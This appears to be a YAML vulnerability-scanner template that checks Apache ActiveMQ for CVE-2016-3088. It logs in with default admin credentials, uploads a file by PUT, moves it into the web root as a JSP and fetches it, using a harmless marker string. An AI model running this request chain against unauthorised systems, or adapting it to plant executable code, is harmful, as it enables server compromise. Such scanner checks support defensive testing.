name: activemq-cve-2016-3088
rules:
  - method: PUT
    path: /fileserver/T0dCu60ad018uI8R41.txt
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    body: e52c6fec-cef3-11e9-984c-28d244522f2f
    follow_redirects: false
    expression: |
      status==204
  - method: GET
    path: /admin/test/index.jsp
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    search: |
      activemq.home=(.*?),
    follow_redirects: false
    expression: |
      status==200
  - method: MOVE
    path: /fileserver/T0dCu60ad018uI8R41.txt
    headers:
      Destination: "file://{{1}}/webapps/api/T0dCu60ad018uI8R41api.jsp"
      Authorization: Basic YWRtaW46YWRtaW4=
    follow_redirects: false
    expression: |
      status==204
  - method: GET
    path: /api/T0dCu60ad018uI8R41api.jsp
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    follow_redirects: false
    expression: |
      status==200 && body.bcontains(b'e52c6fec-cef3-11e9-984c-28d244522f2f')

detail:
  author: phith0n
  link: https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088
